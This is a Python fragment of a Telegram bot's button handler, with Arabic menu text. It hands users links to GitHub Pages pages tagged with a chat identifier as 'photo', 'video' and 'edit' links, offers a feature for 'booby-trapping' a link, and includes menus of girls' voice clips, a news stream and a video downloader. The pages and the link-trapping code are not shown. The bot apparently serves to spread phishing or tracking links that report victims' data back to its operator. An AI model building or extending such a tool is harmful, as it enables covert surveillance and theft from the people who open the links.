@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    
    # إصلاح الروابط
    if call.data == "get_photo_link":
        bot.send_message(chat_id, f"🖼️ رابط الصور:\nhttps://app-display.github.io/ca.html-chatld-/")
    elif call.data == "get_video_link":
        bot.send_message(chat_id, f"🎥 رابط الفيديو:\nhttps://app-display.github.io/ca.html-chatId")
    elif call.data == "get_image_edit_link":
        bot.send_message(chat_id, f"✨ رابط التعديل:\nhttps://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/")
    
    # إصلاح قسم الصوتيات
    elif call.data == "voice_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("👧 الفتاة 1 (10 مقاطع)", callback_data="voice_girl1"),
            types.InlineKeyboardButton("👩 الفتاة 2 (13 مقطع)", callback_data="voice_girl2"),
            types.InlineKeyboardButton("🔙 عودة", callback_data="main_menu")
        )
        bot.edit_message_text("🎧 اختر الفتاة للاستماع للمقاطع:", chat_id, call.message.message_id, reply_markup=markup)
    
    elif call.data == "voice_girl1":
        bot.answer_callback_query(call.id, "جاري تحميل قائمة الفتاة 1...")
        # يمكنك إضافة الكود هنا لإرسال المقاطع الـ 10
        bot.send_message(chat_id, "تم اختيار الفتاة 1 (10 مقاطع جاهزة للإرسال)")
        
    elif call.data == "voice_girl2":
        bot.answer_callback_query(call.id, "جاري تحميل قائمة الفتاة 2...")
        # يمكنك إضافة الكود هنا لإرسال المقاطع الـ 13
        bot.send_message(chat_id, "تم اختيار الفتاة 2 (13 مقطع جاهزة للإرسال)")

    # باقي الأقسام كما هي
    elif call.data == "news_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("🔴 الجزيرة مباشر", web_app=types.WebAppInfo(url="https://www.aljazeera.net/live")),
            types.InlineKeyboardButton("🔙 عودة", callback_data="main_menu")
        )
        bot.edit_message_text("🌐 البث المباشر:", chat_id, call.message.message_id, reply_markup=markup)
    
    elif call.data == "inject_start":
        user_states[chat_id] = "waiting_for_inject_link"
        bot.edit_message_text("💣 أرسل الرابط الذي تريد تلغيمه:", chat_id, call.message.message_id)

    elif call.data == "dl_video":
        user_states[chat_id] = "waiting_for_url"
        bot.edit_message_text("📥 أرسل رابط الفيديو للتحميل:", chat_id, call.message.message_id)
    
    elif call.data == "main_menu":
        bot.edit_message_text("🤖 القائمة الرئيسية:", chat_id, call.message.message_id, reply_markup=get_main_keyboard())
    
    bot.answer_callback_query(call.id)
